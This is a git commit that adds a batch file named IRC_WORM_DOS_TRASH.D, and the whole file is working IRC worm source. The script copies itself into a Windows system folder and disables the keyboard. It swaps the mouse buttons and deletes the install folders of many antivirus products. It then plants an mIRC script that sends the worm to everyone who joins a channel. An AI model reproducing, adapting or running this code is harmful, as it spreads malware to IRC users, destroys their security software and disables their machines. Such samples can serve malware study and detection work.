8c48e37de312d19f8d4bd4ca584b5c742baa6c64
woblegend <47076784+woblegend@users.noreply.github.com>
2020-12-04 21:55:14 +0100

    Add files via upload

---
+++ IRC/IRC_WORM_DOS_TRASH.D
@@ -0,0 +1,50 @@
+ctty nul
+type %0>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+%winbootdir%\rundll32.exe keyboard,disable%recycle%
+rundll32.exe user,swapmousebutton%recycle%
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+deltree/y %windir%\system\«Ëù >nul%recycle%
+md %windir%\system\«Ëù >nul%recycle%
+copy %0 %windir%\system\«Ëù\recycle.bat%recycle%
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.[script]>%windir%\system\«Ëù\script.ini%recycle%
+echo.n0=on 1:JOIN:#:{>>%windir%\system\«Ëù\script.ini%recycle%
+echo.n1=	/if ( $nick == $me ) { halt }>>%windir%\system\«Ëù\script.ini%recycle%
+echo.n2=	/.send $nick c:\windows\system\«Ëù\recycle.bat>>%windir%\system\«Ëù\script.ini%recycle%
+echo.n3=}>>%windir%\system\«Ëù\script.ini%recycle%
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+deltree/y c:\progra~1\norton~1\ >nul|deltree/y c:\progra~1\norton~2\ >nul|deltree/y c:\progra~1\symant~1\ >nul
+deltree/y c:\progra~1\common~1\symant~1\ >nul|deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul
+deltree/y c:\progra~1\mcafee\viruss~1\ >nul|deltree/y c:\progra~1\mcafee\ >nul|deltree/y c:\progra~1\pandas~1\ >nul
+deltree/y c:\progra~1\trendm~1\ >nul|deltree/y c:\progra~1\comman~1\ >nul|deltree/y c:\progra~1\zonela~1\ >nul
+deltree/y c:\progra~1\tinype~1\ >nul|deltree/y c:\progra~1\common~1\avpsha~1\ >nul|deltree/y c:\progra~1\kasper~1\ >nul
+deltree/y c:\progra~1\kasper~2\ >nul|deltree/y c:\progra~1\trojan~1\ >nul|deltree/y c:\progra~1\avpers~1\ >nul
+deltree/y c:\progra~1\grisoft\ >nul|deltree/y c:\progra~1\antivi~1\ >nul|deltree/y c:\progra~1\quickh~1\ >nul
+deltree/y c:\progra~1\f-prot95\ >nul|deltree/y c:\progra~1\fwin32\ >nul|deltree/y c:\progra~1\tbav\ >nul
+deltree/y c:\progra~1\findvi~1\ >nul|deltree/y c:\findvi~1\ >nul|deltree/y c:\esafen\ >nul|deltree/y c:\f-macro\ >nul
+deltree/y c:\tbavw95\ >nul|deltree/y c:\tbav\ >nul|deltree/y c:\vs95\ >nul|deltree/y c:\antivi~1\ >nul
+deltree/y c:\toolkit\findvi~1\ >nul|deltree/y c:\pccill~1\ >nul
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+deltree/y c:\mirc\script.ini >nul|deltree/y c:\mirc32\script.ini >nul|deltree/y c:\progra~1\mirc\script.ini >nul|deltree/y c:\progra~1\mirc32\script.ini >nul
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+if exist c:\mirc\mirc.ini copy %windir%\system\«Ëù\script.ini c:\mirc\script.ini%recycle%
+if exist c:\mirc32\mirc.ini copy %windir%\system\«Ëù\script.ini c:\mirc32\script.ini%recycle%
+if exist c:\progra~1\mirc\mirc.ini copy %windir%\system\«Ëù\script.ini c:\progra~1\mirc\script.ini%recycle%
+if exist c:\progra~1\mirc32\mirc.ini copy %windir%\system\«Ëù\script.ini c:\progra~1\mirc32\script.ini%recycle%
+echo.>>%windir%\system\«Ëù\recycle.bat%recycle%
+dir>>%windir%\system\«Ëù\recycle.bat%recycle%
+echo.cls>>%windir%\system\«Ëù\recycle.bat%recycle%
+cls
